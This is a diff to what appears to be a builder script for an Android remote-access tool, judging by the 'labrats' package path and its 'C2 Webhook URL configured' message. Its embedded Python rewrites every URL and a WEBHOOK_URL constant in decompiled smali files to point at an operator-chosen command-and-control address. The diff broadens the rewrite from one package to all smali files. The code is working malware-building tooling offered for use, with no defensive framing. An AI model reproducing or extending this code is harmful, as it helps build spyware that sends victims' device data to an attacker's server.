@@ -298,23 +298,27 @@ if [ -n "$WEB_URL" ]; then
 import sys, os, re
 
 target_dir, web_url = sys.argv[1], sys.argv[2]
-for root, _, files in os.walk(target_dir):
-    if "com/labs/labrats" in root.replace("\\", "/"):
-        for f in files:
-            if f.endswith(".smali"):
-                sf = os.path.join(root, f)
-                try:
-                    with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
-                        content = sfile.read()
+url_pattern = re.compile(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*')
 
-                    new_content = re.sub(r'https?://[a-zA-Z0-9_.-]+(?::\d+)?(?:/[a-zA-Z0-9_.-]*)*', web_url, content)
+count = 0
+for root, _, files in os.walk(target_dir):
+    for f in files:
+        if f.endswith(".smali"):
+            sf = os.path.join(root, f)
+            try:
+                with open(sf, 'r', encoding='utf-8', errors='ignore') as sfile:
+                    content = sfile.read()
+
+                if "onrender.com" in content or "WEBHOOK_URL" in content or "http://" in content or "https://" in content:
+                    new_content = url_pattern.sub(web_url, content)
                     new_content = re.sub(r'(\.field\s+public\s+static\s+final\s+WEBHOOK_URL:Ljava/lang/String;\s*=\s*")[^"]*(")', r'\1' + web_url + r'\2', new_content)
 
                     if new_content != content:
                         with open(sf, 'w', encoding='utf-8') as sfile:
                             sfile.write(new_content)
-                except Exception:
-                    pass
+                        count += 1
+            except Exception:
+                pass
 EOF
     echo -e "${GREEN}[✓] C2 Webhook URL configured: $WEB_URL_CLEAN${NC}"
 fi
